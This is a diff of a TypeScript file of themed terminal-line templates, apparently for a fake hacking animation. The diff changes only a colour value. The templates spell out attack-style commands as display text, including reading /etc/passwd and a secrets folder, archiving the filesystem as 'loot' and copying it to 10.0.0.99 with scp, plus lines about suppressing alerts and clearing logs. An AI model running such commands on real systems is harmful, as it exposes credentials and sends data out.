@@ -17,45 +17,45 @@ export const POOLS = {
 
 /** Tier 1 — Initial Access (1.0x–1.5x) */
 export const TIER1: LineTemplate[] = [
-  { text: '$ ssh -i exploit.key {user}@{ip}', color: '#805800', type: 'command' },
-  { text: 'Connecting to {hostname}:{port}...', color: '#805800', type: 'normal' },
+  { text: '$ ssh -i exploit.key {user}@{ip}', color: '#c08400', type: 'command' },
+  { text: 'Connecting to {hostname}:{port}...', color: '#c08400', type: 'normal' },
   { text: '[+] Authentication successful', color: '#00cc66', type: 'success' },
-  { text: '{hostname} — {os} — uptime {uptime}', color: '#805800', type: 'normal' },
-  { text: '$ nmap -sS {ip} -p 1-1024', color: '#805800', type: 'command' },
-  { text: 'PORT    STATE    SERVICE', color: '#805800', type: 'normal' },
-  { text: '22/tcp  open     ssh', color: '#805800', type: 'normal' },
-  { text: '443/tcp open     https', color: '#805800', type: 'normal' },
-  { text: '3306/tcp open    mysql', color: '#805800', type: 'normal' },
+  { text: '{hostname} — {os} — uptime {uptime}', color: '#c08400', type: 'normal' },
+  { text: '$ nmap -sS {ip} -p 1-1024', color: '#c08400', type: 'command' },
+  { text: 'PORT    STATE    SERVICE', color: '#c08400', type: 'normal' },
+  { text: '22/tcp  open     ssh', color: '#c08400', type: 'normal' },
+  { text: '443/tcp open     https', color: '#c08400', type: 'normal' },
+  { text: '3306/tcp open    mysql', color: '#c08400', type: 'normal' },
   { text: '[*] Enumerating shares...', color: '#cc8800', type: 'warning' },
   { text: '[+] Session opened.', color: '#00cc66', type: 'success' },
 ];
 
 /** Tier 2 — Reconnaissance (1.5x–3.0x) */
 export const TIER2: LineTemplate[] = [
-  { text: '$ find / -perm -u=s -type f 2>/dev/null', color: '#805800', type: 'command' },
-  { text: '$ cat /etc/passwd | grep -v nologin', color: '#805800', type: 'command' },
+  { text: '$ find / -perm -u=s -type f 2>/dev/null', color: '#c08400', type: 'command' },
+  { text: '$ cat /etc/passwd | grep -v nologin', color: '#c08400', type: 'command' },
   { text: '[*] Scanning internal network...', color: '#cc8800', type: 'warning' },
-  { text: '10.0.0.1 - gateway - open 22,80,443', color: '#805800', type: 'normal' },
-  { text: '10.0.0.12 - {hostname} - open 3306', color: '#805800', type: 'normal' },
+  { text: '10.0.0.1 - gateway - open 22,80,443', color: '#c08400', type: 'normal' },
+  { text: '10.0.0.12 - {hostname} - open 3306', color: '#c08400', type: 'normal' },
   { text: '[+] SMB shares discovered: 3', color: '#00cc66', type: 'success' },
-  { text: 'Mounting remote filesystem...', color: '#805800', type: 'normal' },
+  { text: 'Mounting remote filesystem...', color: '#c08400', type: 'normal' },
   { text: '[+] Access: /var/backups — read/write', color: '#00cc66', type: 'success' },
-  { text: '$ ls -la /home/{user}/', color: '#805800', type: 'command' },
-  { text: '.bash_history  .ssh  .env', color: '#805800', type: 'normal' },
+  { text: '$ ls -la /home/{user}/', color: '#c08400', type: 'command' },
+  { text: '.bash_history  .ssh  .env', color: '#c08400', type: 'normal' },
   { text: '[*] Credential file detected.', color: '#cc8800', type: 'warning' },
 ];
 
 /** Tier 3 — Privilege Escalation (3.0x–6.0x) */
 export const TIER3: LineTemplate[] = [
   { text: '[+] ROOT ACCESS GRANTED', color: '#00cc66', type: 'success' },
-  { text: 'root@{hostname}:~# ls /opt/.secrets/', color: '#805800', type: 'command' },
+  { text: 'root@{hostname}:~# ls /opt/.secrets/', color: '#c08400', type: 'command' },
   { text: 'master.key  vpn-gateway.ovpn  credentials.kdbx', color: '#cc8800', type: 'warning' },
-  { text: 'root@{hostname}:~# cat {sensitive_file}', color: '#805800', type: 'command' },
+  { text: 'root@{hostname}:~# cat {sensitive_file}', color: '#c08400', type: 'command' },
   { text: '[*] Pivoting to {next_host}...', color: '#cc8800', type: 'warning' },
   { text: '[+] SSH key accepted', color: '#00cc66', type: 'success' },
   { text: 'Injecting payload into kernel module...', color: '#cc8800', type: 'warning' },
   { text: '[+] Persistence established.', color: '#00cc66', type: 'success' },
-  { text: '$ sudo -l', color: '#805800', type: 'command' },
+  { text: '$ sudo -l', color: '#c08400', type: 'command' },
   { text: '(ALL : ALL) NOPASSWD: ALL', color: '#ff8c00', type: 'warning' },
 ];
 
@@ -68,8 +68,8 @@ export const TIER4: LineTemplate[] = [
   { text: 'Bypassing DLP controls...', color: '#ff8c00', type: 'warning' },
   { text: '[+] DLP bypass successful.', color: '#00cc66', type: 'success' },
   { text: '[!] IDS signature match — suppressing alert', color: '#ff6600', type: 'danger' },
-  { text: 'root@{hostname}:~# tar -czf /tmp/loot.tar.gz /', color: '#805800', type: 'command' },
-  { text: '$ scp /tmp/loot.tar.gz {user}@10.0.0.99:/', color: '#805800', type: 'command' },
+  { text: 'root@{hostname}:~# tar -czf /tmp/loot.tar.gz /', color: '#c08400', type: 'command' },
+  { text: '$ scp /tmp/loot.tar.gz {user}@10.0.0.99:/', color: '#c08400', type: 'command' },
   { text: '[*] Covering tracks... clearing logs', color: '#ff8c00', type: 'warning' },
 ];
 
